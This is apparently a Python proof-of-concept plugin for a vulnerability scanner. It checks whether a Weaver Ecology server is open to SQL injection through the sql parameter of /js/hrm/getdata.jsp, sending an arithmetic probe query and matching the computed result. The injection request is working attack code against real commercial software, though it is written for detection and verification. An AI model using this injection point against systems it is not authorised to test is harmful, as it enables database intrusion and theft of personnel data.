from xing.core.BasePlugin import BasePlugin
from xing.utils import http_req
from xing.core import PluginType, SchemeType


class Plugin(BasePlugin):
    def __init__(self):
        super(Plugin, self).__init__()
        self.plugin_type = PluginType.POC
        self.vul_name = "泛微 Ecology getdata.jsp SQL注入漏洞"
        self.app_name = 'Ecology'
        self.scheme = [SchemeType.HTTP, SchemeType.HTTPS]

    def verify(self, target):
        url = target + "/help/sys/help.html"
        if b'$(this).attr("src","image/btn_help_click' not in http_req(url).content:
            self.logger.debug("not Ecology {}".format(target))
            return False

        path = "/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20111111*1111%20as%20id%20from%20HrmResourceManager"

        url = target + path
        content = http_req(url).content

        if b"<" in content:
            return False

        if b"123444321" in content:
            self.logger.success("found Ecology SQLI {}".format(target))
            return url